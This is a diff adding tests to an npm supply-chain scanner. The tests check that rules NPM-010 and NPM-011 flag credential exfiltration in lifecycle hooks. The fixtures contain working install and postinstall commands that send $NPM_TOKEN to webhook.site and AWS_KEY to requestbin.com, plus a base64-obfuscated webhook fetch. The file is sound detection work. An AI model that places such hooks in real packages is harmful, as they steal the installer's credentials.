@@ -452,3 +452,67 @@ class TestShaHuludPatterns:
         # Should NOT trigger on README content (only scans package.json and .js files)
         critical_findings = [f for f in findings if f.severity.value == "critical"]
         assert len(critical_findings) == 0
+
+    def test_webhook_site_exfiltration(self, tmp_path):
+        """Test NPM-010: Webhook.site exfiltration."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "exfiltrator",
+            "scripts": {
+                "postinstall": "curl -X POST https://webhook.site/abc123 -d \"secrets=$NPM_TOKEN\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-010" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_requestbin_exfiltration(self, tmp_path):
+        """Test webhook exfiltration with requestbin."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "exfiltrator",
+            "scripts": {
+                "install": "node -e \"require('https').get('https://requestbin.com/xyz?data=' + process.env.AWS_KEY)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-010" for f in findings)
+
+    def test_obfuscated_webhook_domain(self, tmp_path):
+        """Test NPM-011: Obfuscated webhook domain."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "sneaky",
+            "scripts": {
+                "postinstall": "node -e \"const url = Buffer.from('d2ViaG9vay5zaXRl', 'base64').toString(); fetch(url)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-011" for f in findings)
+
+    def test_webhook_documentation_no_false_positive(self, tmp_path):
+        """Test that webhook.site in README doesn't trigger."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "docs",
+            "scripts": {"test": "echo test"}
+        }))
+
+        readme = tmp_path / "README.md"
+        readme.write_text("Test webhooks at webhook.site")
+
+        findings = plugin.scan(tmp_path)
+        # README is not scanned, only package.json and .js files
+        assert len(findings) == 0
